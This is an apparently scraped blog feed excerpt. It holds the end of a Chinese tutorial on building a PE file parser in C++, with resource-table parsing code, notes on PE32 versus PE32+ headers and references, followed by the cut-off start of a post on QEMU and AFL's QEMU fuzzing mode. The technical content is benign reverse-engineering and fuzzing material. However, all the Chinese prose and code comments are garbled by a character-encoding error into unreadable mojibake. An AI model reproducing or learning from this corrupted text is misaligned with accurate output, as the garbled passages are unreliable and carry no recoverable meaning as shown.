å­—æ®µæŒ‡å‘çš„èµ„æºæ•°æ®çš„å¤§å°ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰ã€‚</td></tr><tr><td align="left">8</td><td align="left">4</td><td align="left">codepage</td><td align="left">ç”¨äºè§£ç èµ„æºæ•°æ®ä¸­çš„ç ä½å€¼çš„ä»£ç é¡µã€‚ é€šå¸¸ï¼Œä»£ç é¡µå°†æ˜¯ Unicode ä»£ç é¡µã€‚</td></tr><tr><td align="left">12</td><td align="left">4</td><td align="left">ä¿ç•™ï¼Œå¿…é¡»ä¸º 0ã€‚</td><td align="left"></td></tr></tbody></table><hr><ul><li>è§£ææµç¨‹ï¼š<ul><li>æŒ‰åºä¾æ¬¡è§£æå³å¯</li></ul></li><li>å¤„ç†ä»£ç ï¼š</li></ul><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PE32::parse_resources_table</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br><span class="hljs-type">size_t</span> read_size;<br><br><span class="hljs-keyword">if</span> (!resource_dir_table_rva || !resource_dir_table_size) <span class="hljs-keyword">return</span>;<br><br><span class="hljs-built_in">fseek</span>(pe_fp, <span class="hljs-built_in">va_to_raw</span>(resource_dir_table_rva), SEEK_SET);<br>read_size = <span class="hljs-built_in">fread</span>(&amp;resource_dir_root, <span class="hljs-built_in">sizeof</span>(___IMAGE_RESOURCE_DIRECTORY), <span class="hljs-number">1</span>, pe_fp);<br><br><span class="hljs-keyword">if</span> (read_size != <span class="hljs-number">1</span>) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Bad PE file!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br><br><span class="hljs-comment">// ä¹‹åçš„æ“ä½œå°±äº¤ç»™print()å‡½æ•°å»å¤„ç†</span><br>}<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PE32::print_resources_table_info</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br><br><span class="hljs-keyword">if</span> (!resource_dir_table_rva || !resource_dir_table_size) {<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"=====No resource table=====\n\n"</span>);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"\n==========END=========\n\n"</span>);<br><span class="hljs-keyword">return</span>;<br>}<br><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"=======Resource table======\n\n"</span>);<br><br><span class="hljs-type">size_t</span> read_size;<br>DWORD total_entries_num = resource_dir_root.NumberOfNamedEntries +<br>resource_dir_root.NumberOfIdEntries;<br>DWORD i, j;<br><br>___IMAGE_RESOURCE_DIRECTORY_ENTRY tmp_entries_0;<br><br>DWORD start_pos = <span class="hljs-built_in">va_to_raw</span>(resource_dir_table_rva);<br><br><span class="hljs-comment">// å…ˆè¯»å–ç¬¬ä¸€å±‚çš„entries</span><br><span class="hljs-comment">// è¿™é‡Œç”¨é€’å½’è§£ææ˜¯ä¸æ˜¯æ›´ä¼˜é›…ç‚¹ï¼Ÿï¼ˆTODO?ï¼‰</span><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; total_entries_num; i++) {<br><br><span class="hljs-built_in">fseek</span>(pe_fp, start_pos + <span class="hljs-built_in">sizeof</span>(__IMAGE_RESOURCE_DIRECTORY) + i * <span class="hljs-built_in">sizeof</span>(___IMAGE_RESOURCE_DIRECTORY_ENTRY), SEEK_SET);<br><br>read_size = <span class="hljs-built_in">fread</span>(&amp;tmp_entries_0, <span class="hljs-built_in">sizeof</span>(___IMAGE_RESOURCE_DIRECTORY_ENTRY), <span class="hljs-number">1</span>, pe_fp);<br><br><span class="hljs-keyword">if</span> (read_size != <span class="hljs-number">1</span>) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Bad PE!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br><br><span class="hljs-keyword">if</span> (tmp_entries_0.DUMMYUNIONNAME.DUMMYSTRUCTNAME.NameIsString) {<br><span class="hljs-comment">// èµ„æºIDæ˜¯å­—ç¬¦ä¸²</span><br><span class="hljs-built_in">fseek</span>(pe_fp, start_pos + tmp_entries_0.DUMMYUNIONNAME.DUMMYSTRUCTNAME.NameOffset, SEEK_SET);<br>WORD unicode_len;<br><span class="hljs-built_in">fread</span>(&amp;unicode_len, <span class="hljs-built_in">sizeof</span>(WORD), <span class="hljs-number">1</span>, pe_fp);<br><span class="hljs-type">wchar_t</span>* name_tmp = (<span class="hljs-type">wchar_t</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">wchar_t</span>) * (unicode_len + <span class="hljs-number">1</span>));<br><span class="hljs-keyword">if</span> (!name_tmp) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Name_tmp malloc failed!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br>name_tmp[unicode_len] = <span class="hljs-number">0</span>;<br><span class="hljs-built_in">fread</span>(name_tmp, <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">wchar_t</span>), unicode_len, pe_fp);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">" * Name Entry: %ws\n"</span>, name_tmp);<br><span class="hljs-built_in">free</span>(name_tmp);<br>}<br><span class="hljs-keyword">else</span> {<br><span class="hljs-comment">// èµ„æºIDæ˜¯æ•°å­—</span><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">" * ID Entry: %03d\n"</span>, tmp_entries_0.DUMMYUNIONNAME.Id);<br>}<br><br><span class="hljs-comment">// fprintf(stdout, "    - \n");</span><br><br><span class="hljs-comment">// è§£æç¬¬äºŒå±‚</span><br><span class="hljs-keyword">if</span> (tmp_entries_0.DUMMYUNIONNAME2.DUMMYSTRUCTNAME2.DataIsDirectory) {<br><span class="hljs-comment">// è·å–ç¬¬äºŒçº§ç›®å½•è¡¨</span><br>DWORD offset = tmp_entries_0.DUMMYUNIONNAME2.DUMMYSTRUCTNAME2.OffsetToDirectory;<br><span class="hljs-built_in">fseek</span>(pe_fp, offset + start_pos, SEEK_SET);<br>___IMAGE_RESOURCE_DIRECTORY tmp_dir;<br><span class="hljs-built_in">fread</span>(&amp;tmp_dir, <span class="hljs-built_in">sizeof</span>(___IMAGE_RESOURCE_DIRECTORY), <span class="hljs-number">1</span>, pe_fp);<br>DWORD total_entries_num_2 = tmp_dir.NumberOfIdEntries + tmp_dir.NumberOfNamedEntries;<br><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"    - Entries Count: %d\n"</span>, total_entries_num_2);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"    - Subentries:\n"</span>);<br><br><span class="hljs-comment">// ä¾ç„¶è§£æèµ„æºåæ˜¯æ•°å­—è¿˜æ˜¯å­—ç¬¦ä¸²</span><br><span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; total_entries_num_2; j++) {<br><br>__IMAGE_RESOURCE_DIRECTORY_ENTRY tmp_entries_1;<br><span class="hljs-built_in">fseek</span>(pe_fp, offset + start_pos + <span class="hljs-built_in">sizeof</span>(___IMAGE_RESOURCE_DIRECTORY) + j * <span class="hljs-built_in">sizeof</span>(__IMAGE_RESOURCE_DIRECTORY_ENTRY), SEEK_SET);<br><span class="hljs-built_in">fread</span>(&amp;tmp_entries_1, <span class="hljs-built_in">sizeof</span>(__IMAGE_RESOURCE_DIRECTORY_ENTRY), <span class="hljs-number">1</span>, pe_fp);<br><br><span class="hljs-keyword">if</span> (tmp_entries_1.DUMMYUNIONNAME.DUMMYSTRUCTNAME.NameIsString) {<br><br><span class="hljs-comment">// èµ„æºåæ˜¯å­—ç¬¦ä¸²ï¼Œè§£æå­—ç¬¦ä¸²</span><br><span class="hljs-built_in">fseek</span>(pe_fp, start_pos + tmp_entries_1.DUMMYUNIONNAME.DUMMYSTRUCTNAME.NameOffset, SEEK_SET);<br>WORD unicode_len;<br><span class="hljs-built_in">fread</span>(&amp;unicode_len, <span class="hljs-built_in">sizeof</span>(WORD), <span class="hljs-number">1</span>, pe_fp);<br><span class="hljs-type">wchar_t</span>* name_tmp = (<span class="hljs-type">wchar_t</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">wchar_t</span>) * (unicode_len + <span class="hljs-number">1</span>));<br><span class="hljs-keyword">if</span> (!name_tmp) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Name_tmp malloc failed!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br>name_tmp[unicode_len] = <span class="hljs-number">0</span>;<br><span class="hljs-built_in">fread</span>(name_tmp, <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">wchar_t</span>), unicode_len, pe_fp);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"       - Name Entry: %ws\n"</span>, name_tmp);<br><br>}<br><span class="hljs-keyword">else</span> {<br><br><span class="hljs-comment">// èµ„æºåæ˜¯æ•°å­—</span><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"       - ID Entry: %03d\n"</span>, tmp_entries_1.DUMMYUNIONNAME.Id);<br><br>}<br><br><span class="hljs-comment">// æœ€åä¸€å±‚èµ„æº</span><br><br><span class="hljs-keyword">if</span> (tmp_entries_1.DUMMYUNIONNAME2.DUMMYSTRUCTNAME2.DataIsDirectory) {<br><br>___IMAGE_RESOURCE_DIRECTORY_ENTRY tmp_entries_2;<br>___IMAGE_RESOURCE_DATA_ENTRY data_entry;<br><br><span class="hljs-built_in">fseek</span>(pe_fp, start_pos + tmp_entries_1.DUMMYUNIONNAME2.DUMMYSTRUCTNAME2.OffsetToDirectory + <span class="hljs-built_in">sizeof</span>(___IMAGE_RESOURCE_DIRECTORY), SEEK_SET);<br><span class="hljs-built_in">fread</span>(&amp;tmp_entries_2, <span class="hljs-built_in">sizeof</span>(tmp_entries_2), <span class="hljs-number">1</span>, pe_fp);<br><br><span class="hljs-built_in">fseek</span>(pe_fp, start_pos + tmp_entries_2.DUMMYUNIONNAME2.DUMMYSTRUCTNAME2.OffsetToDirectory, SEEK_SET);<br><span class="hljs-built_in">fread</span>(&amp;data_entry, <span class="hljs-built_in">sizeof</span>(data_entry), <span class="hljs-number">1</span>, pe_fp);<br><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"          - Resource's RVA: 0x%0X\n"</span>, data_entry.OffsetToData);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"          - Resource's Size: 0x%0X\n"</span>, data_entry.Size);<br><br>}<br><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"\n"</span>);<br>}<br>}<br>}<br><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"\n==========END=========\n\n"</span>);<br><br>}<br></code></pre></td></tr></tbody></table></figure><ul><li>è¿è¡Œç»“æœï¼š</li></ul><p><img src="/2023/08/03/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E6%89%8B%E6%90%93%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84PE%E8%A7%A3%E6%9E%90%E5%99%A8/14.png"></p><p>è‡³æ­¤ï¼Œæˆ‘ä»¬å·²ç»åŸºæœ¬ä¸Šå®Œæˆäº†PE32æ–‡ä»¶çš„è§£æå·¥ä½œã€‚</p><h2 id="Step-4-è§£æPE32"><a href="#Step-4-è§£æPE32" class="headerlink" title="Step 4: è§£æPE32+"></a>Step 4: è§£æPE32+</h2><ul><li><p>PE32+ï¼Œi.e. 64ä½çš„PEæ–‡ä»¶</p></li><li><p>PE32ä¸PE32+çš„åŒºåˆ«ï¼š</p><p><span class="github-emoji"><span>1âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> ç¬¬ä¸€ä¸ªå¾ˆæ˜¾ç„¶çš„ï¼Œ<code>NT Header - Optional Header</code>çš„<code>Magic</code>å­—æ®µä¸åŒï¼Œå¯¹äº<code>PE32</code>æ¥è¯´æ˜¯<code>10Bï¼ˆNT32ï¼‰</code>ï¼Œå¯¹äº<code>PE32+</code>æ¥è¯´æ˜¯<code>20Bï¼ˆNT64ï¼‰</code>ï¼›</p><p><span class="github-emoji"><span>2âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <code>PE32+</code>çš„<code>NT Header - Optional Header</code>ä¸<code>PE32</code>ä¸åŒï¼Œä¸»è¦ä½“ç°åœ¨ï¼š</p><ul><li><code>PE32</code>æœ‰ä¸€ä¸ªå­—æ®µä¸º<code>BaseofData</code>ï¼Œè€Œ<code>PE32+</code>æ²¡æœ‰ï¼ˆè¯¥4ä¸ªå­—èŠ‚ç»™äº†<code>ImageBase</code>ï¼Œå› ä¸º<code>ImageBase</code>ç”±4å­—èŠ‚æ‰©å±•åˆ°äº†8å­—èŠ‚ï¼‰ï¼›</li><li><code>PE32+</code>ä¸­ï¼Œ<code>ImageBase</code>ã€<code>SizeOfStackReserve</code>ã€<code>SizeOfStackCommit</code>ã€<code>SizeOfHeapReserve</code>ã€<code>SizeOfHeapCommit</code>ç”±4å­—èŠ‚æ‰©å±•åˆ°8å­—èŠ‚ï¼Œå› æ­¤<code>PE32+</code>çš„<code>NT Header64</code>è¦æ¯”<code>PE32</code>çš„<code>NT Header32</code>å¤šå‡º 4*4 = 16å­—èŠ‚ï¼ˆå¦‚å‰æ‰€è¿°ï¼Œ<code>BaseofData</code>çš„å­—èŠ‚å·²ç»åˆ†ç»™äº†<code>ImageBase</code>ï¼‰</li><li>åœ¨<code>PE32+</code>ä¸­ï¼Œå¯¼å…¥è¡¨çš„å¯¼å…¥æŸ¥æ‰¾è¡¨ITLä¸º64ä½çš„æ•°ç»„ï¼Œè€Œåœ¨<code>PE32</code>ä¸­ï¼Œå…¶ä¸º32ä½æ•°ç»„ï¼Œè¿™é‡Œéœ€è¦åŒºåˆ†</li></ul></li><li><p>å› æ­¤ï¼Œ<code>PE32+</code>è§£æä¸<code>PE32</code>è§£æä¸åŒä¹‹å¤„ï¼š</p><ul><li><code>NT Header</code>ä¸åŒï¼šä¸»è¦æŒ‡çš„æ˜¯<code>Optional Header</code>ï¼Œè§£ææ—¶éœ€è¦å•ç‹¬å¤„ç†</li><li>å¯¼å…¥æŸ¥æ‰¾è¡¨å¯»å€ï¼š<code>PE32+</code>ä»¥64ä½è¿›è¡Œå¯»å€ï¼Œè€Œ<code>PE32</code>ä»¥32ä½è¿›è¡Œå¯»å€</li></ul><p>æ ¹æ®ä¸Šè¿°ä¸åŒï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆå®¹æ˜“å‘åŠ¨CVæŠ€èƒ½ï¼ˆ<span class="github-emoji"><span>ğŸ˜†</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f606.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>ï¼‰å®ç°å¯¹<code>PE32+</code>æ–‡ä»¶çš„è§£æ</p></li></ul><h2 id="References"><a href="#References" class="headerlink" title="References:"></a>References:</h2><ol><li><a href="https://0xrick.github.io/win-internals/pe2/">A dive into the PE file format - PE file structure - Part 1: Overview - 0xRickâ€™s Blog</a></li><li><a href="https://0xrick.github.io/win-internals/pe3/">A dive into the PE file format - PE file structure - Part 2: DOS Header, DOS Stub and Rich Header - 0xRickâ€™s Blog</a></li><li><a href="https://0xrick.github.io/win-internals/pe4/">A dive into the PE file format - PE file structure - Part 3: NT Headers - 0xRickâ€™s Blog</a></li><li><a href="https://0xrick.github.io/win-internals/pe5/">A dive into the PE file format - PE file structure - Part 4: Data Directories, Section Headers and Sections - 0xRickâ€™s Blog</a></li><li><a href="https://0xrick.github.io/win-internals/pe6/">A dive into the PE file format - PE file structure - Part 5: PE Imports (Import Directory Table, ILT, IAT) - 0xRickâ€™s Blog</a></li><li><a href="https://0xrick.github.io/win-internals/pe7/">A dive into the PE file format - PE file structure - Part 6: PE Base Relocations - 0xRickâ€™s Blog</a></li><li>[<a href="https://bbs.kanxue.com/thread-252795.htm#msg_header_h2_8">åŸåˆ›]æ‰“é€ è‡ªå·±çš„PEè§£æå™¨-ç¼–ç¨‹æŠ€æœ¯-çœ‹é›ª-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|kanxue.com</a></li><li>[PE-learning/PE learning at master Â· jmhIcoding/PE-learning (github.com)](<a href="https://github.com/jmhIcoding/PE-learning/tree/master/PE">https://github.com/jmhIcoding/PE-learning/tree/master/PE</a> learning)</li><li><a href="https://0xrick.github.io/win-internals/pe8/#a-dive-into-the-pe-file-format---lab-1-writing-a-pe-parser">A dive into the PE file format - LAB 1: Writing a PE Parser - 0xRickâ€™s Blog</a></li><li><a href="https://www.virusbulletin.com/virusbulletin/2020/01/vb2019-paper-rich-headers-leveraging-mysterious-artifact-pe-format/">Virus Bulletin :: VB2019 paper: Rich Headers: leveraging this mysterious artifact of the PE format</a></li><li><a href="https://www.cnblogs.com/zpchcbd/p/14674298.html">VirtualAddressä¸VirtualSizeä¸SizeOfRawDataä¸PointerToRawDataçš„å…³ç³» - zpchcbd - åšå®¢å›­ (cnblogs.com)</a></li><li><a href="https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#special-sections">PE Format - Win32 apps | Microsoft Learn</a></li><li><a href="https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#the-idata-section">PE Format - Win32 apps | Microsoft Learn</a></li><li><a href="https://learn.microsoft.com/zh-cn/windows/win32/debug/pe-format#the-edata-section-image-only">PE æ ¼å¼ - Win32 apps | Microsoft Learn</a></li><li><a href="http://research32.blogspot.com/2015/01/base-relocation-table.html">research32: Base relocation table</a></li><li><a href="https://learn.microsoft.com/zh-cn/windows/win32/debug/pe-format#the-reloc-section-image-only">PE æ ¼å¼ - Win32 apps | Microsoft Learn</a></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>PE</tag>
      
      <tag>Windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å…³äºQEMUå’ŒAFL-QEMUæ¨¡å¼é‚£äº›äº‹</title>
    <link href="/2023/07/20/%E5%85%B3%E4%BA%8EQEMU%E5%92%8CAFL-QEMU%E6%A8%A1%E5%BC%8F%E9%82%A3%E4%BA%9B%E4%BA%8B/"/>
    <url>/2023/07/20/%E5%85%B3%E4%BA%8EQEMU%E5%92%8CAFL-QEMU%E6%A8%A1%E5%BC%8F%E9%82%A3%E4%BA%9B%E4%BA%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="å…³äºQEMUå’ŒAFL-QEMUæ¨¡å¼é‚£äº›äº‹"><a href="#å…³äºQEMUå’ŒAFL-QEMUæ¨¡å¼é‚£äº›äº‹" class="headerlink" title="å…³äºQEMUå’ŒAFL-QEMUæ¨¡å¼é‚£äº›äº‹"></a>å…³äºQEMUå’ŒAFL-QEMUæ¨¡å¼é‚£äº›äº‹</h1><h2 id="1-QEMUæ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#1-QEMUæ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="1. QEMUæ˜¯ä»€ä¹ˆï¼Ÿ"></a>1. QEMUæ˜¯ä»€ä¹ˆï¼Ÿ</h2><ul><li>QEMUï¼ˆQuick EMUlatorï¼‰æ˜¯ä¸€ä¸ªä»¿çœŸå’Œæ¨¡æ‹Ÿè™šæ‹Ÿç¯å¢ƒçš„å¼€æº<strong>è½¯ä»¶</strong>ï¼Œå…¶æœ¬è´¨ä¸Šè¿˜æ˜¯ä¸€ä¸ªè½¯ä»¶ï¼Œé€šè¿‡<strong>åŠ¨æ€ç¿»è¯‘</strong>å®ç°æ¨¡æ‹Ÿ[1]ã€‚</li><li>è½¯ä»¶è™šæ‹ŸåŒ–</li><li>è·¨å¹³å°</li><li>ä»¿çœŸå¤šç§æ¶æ„çš„å¤„ç†å™¨</li></ul><h3 id="åŠ¨æ€ç¿»è¯‘"><a href="#åŠ¨æ€ç¿»è¯‘" class="headerlink" title="åŠ¨æ€ç¿»è¯‘"></a>åŠ¨æ€ç¿»è¯‘</h3><ul><li>ä»¥æ¨¡æ‹Ÿx86ä¸‹çš„æŒ‡ä»¤ä¸ºä¾‹ï¼ŒåŠ¨æ€ç¿»è¯‘çš„åŸºæœ¬æ€æƒ³å°±æ˜¯æŠŠæ¯ä¸€æ¡x86æŒ‡ä»¤åˆ‡åˆ†ä¸ºè‹¥å¹²æ¡å¾®æ“ä½œï¼Œè€Œæ¯æ¡å¾®æ“ä½œéƒ½æ˜¯ç”±<strong>QEMUä¸­çš„ä¸€æ®µç®€å•çš„Cä»£ç </strong>æ¥å®ç°</li><li>QEMUçš„åŠ¨æ€ç¿»è¯‘åç«¯æ˜¯TCG[2]ï¼ŒTiny Code Generator</li></ul><h3 id="CPU-çŠ¶æ€ä¼˜åŒ–"><a href="#CPU-çŠ¶æ€ä¼˜åŒ–" class="headerlink" title="CPU çŠ¶æ€ä¼˜åŒ–"></a>CPU çŠ¶æ€ä¼˜åŒ–</h3><ul><li>çŠ¶æ€è®°å½•åœ¨ç¿»è¯‘å—ï¼ˆTranslation Blockï¼ŒTBï¼‰ä¸­</li><li>å¦‚æœçŠ¶æ€å‘ç”Ÿæ”¹å˜ï¼Œé‚£ä¹ˆæ–°TBå°†ä¼šç”Ÿæˆï¼Œè€Œä¹‹å‰çš„TBå°†ä¸å†ä½¿ç”¨ç›´åˆ°çŠ¶æ€ä¸ä¹‹å‰çš„TBç›¸åŒ¹é…</li><li>e.g. x86 SS-å †æ ˆæ®µå¯„å­˜å™¨ DS-æ•°æ®æ®µå¯„å­˜å™¨ ES-é™„åŠ æ®µå¯„å­˜å™¨ ä¸º0æ—¶ï¼Œå°†ä¸å†ç”Ÿæˆä¸€ä¸ªæ–°çš„æ®µåŸºå€</li></ul><h3 id="å—ç›´æ¥é“¾æ¥"><a href="#å—ç›´æ¥é“¾æ¥" class="headerlink" title="å—ç›´æ¥é“¾æ¥"></a>å—ç›´æ¥é“¾æ¥</h3><ul><li><p>æ‰§è¡Œå®Œæ¯ä¸€ä¸ªç¿»è¯‘å—ä¹‹åï¼ŒQEMUæ ¹æ®æ¨¡æ‹Ÿçš„PCå’ŒCPUçŠ¶æ€ä¿¡æ¯æ¥æ‰¾åˆ°ä¸‹ä¸€ä¸ªåŸºæœ¬å—ï¼ˆåŸºäºå“ˆå¸Œè¡¨ï¼Ÿï¼‰</p><ul><li>å¦‚æœä¸‹ä¸€ä¸ªå—è¿˜æ²¡è¢«ç¿»è¯‘è¿‡ï¼Œé‚£ä¹ˆå°†è½½å…¥ä¸€ä¸ªæ–°çš„å—</li><li>å¦åˆ™ï¼Œè·³è½¬åˆ°ä¸‹ä¸€ä¸ªå·²ç»ç¿»è¯‘è¿‡çš„å—ä¸­</li></ul></li><li><p>å¯¹äºæ¨¡æ‹Ÿçš„PCå·²çŸ¥çš„æƒ…å†µä¸‹ï¼ŒQEMUç›´æ¥patchä¸€ä¸ªTBï¼šç›´æ¥è·³è½¬</p></li></ul><h3 id="è‡ªä¿®æ”¹ä»£ç å’Œç¿»è¯‘ä»£ç éæ³•æ£€æŸ¥"><a href="#è‡ªä¿®æ”¹ä»£ç å’Œç¿»è¯‘ä»£ç éæ³•æ£€æŸ¥" class="headerlink" title="è‡ªä¿®æ”¹ä»£ç å’Œç¿»è¯‘ä»£ç éæ³•æ£€æŸ¥"></a>è‡ªä¿®æ”¹ä»£ç å’Œç¿»è¯‘ä»£ç éæ³•æ£€æŸ¥</h3><ul><li>å½“ä¸€ä¸ªTBç”Ÿæˆåï¼Œç›¸åº”çš„é¡µæ˜¯å†™ä¿æŠ¤çš„ã€‚å¦‚æœå¯¹è¯¥é¡µè¿›è¡Œå†™æ“ä½œï¼Œé‚£ä¹ˆQEMUå°†ä½¿å¾—æ‰€æœ‰å·²ç¿»è¯‘çš„å—å¤±æ•ˆï¼Œå¹¶é‡æ–°å¯ç”¨å†™æƒé™</li><li>ç»™å®šä¸€ä¸ªé¡µç»´æŠ¤ä¸€ä¸ªç”±æ¯ä¸€ä¸ªTBå—æ„æˆçš„é“¾è¡¨</li></ul><h3 id="å¼‚å¸¸å¤„ç†"><a href="#å¼‚å¸¸å¤„ç†" class="headerlink" title="å¼‚å¸¸å¤„ç†"></a>å¼‚å¸¸å¤„ç†</h3><ul><li><code>longjmp()</code>ï¼šFPE</li><li>SIGSEGVã€SIGBUS</li></ul><h3 id="MMU-æ¨¡æ‹Ÿ"><a href="#MMU-æ¨¡æ‹Ÿ" class="headerlink" title="MMU æ¨¡æ‹Ÿ"></a>MMU æ¨¡æ‹Ÿ</h3><h2 id="2-AFL-QEMUæ¨¡å¼"><a href="#2-AFL-QEMUæ¨¡å¼" class="headerlink" title="2. AFL QEMUæ¨¡å¼"></a>2. AFL QEMUæ¨¡å¼</h2><h3 id="2-1-å®‰è£…"><a href="#2-1-å®‰è£…" class="headerlink" title="2.1 å®‰è£…"></a>2.1 å®‰è£…</h3><ul><li>å®‰è£…ç›¸å…³ä¾èµ–ï¼š</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-comment"># ç¼ºå°‘å•¥ä¾èµ–è¡¥å……å•¥å³å¯ï¼Œè¿™é‡Œä»…å±•ç¤ºåå­—å·®å¼‚è¾ƒå¤§çš„å®‰è£…åŒ…</span><br>$ sudo ap-get install libtool-bin libglib2.0-dev<br></code></pre></td></tr></tbody></table></figure><ul><li>å°†<code>build_qemu_support.sh</code>è„šæœ¬çš„ä¸‹è½½åœ°å€ä¿®æ”¹ä¸º<a href="https://download.qemu.org/qemu-2.10.0.tar.xz%EF%BC%8C%E5%8E%9F%E5%9C%B0%E5%9D%80404%E6%97%A0%E6%B3%95%E8%AE%BF%E9%97%AE">https://download.qemu.org/qemu-2.10.0.tar.xzï¼ŒåŸåœ°å€404æ— æ³•è®¿é—®</a></li><li>è¿è¡Œè„šæœ¬ï¼</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 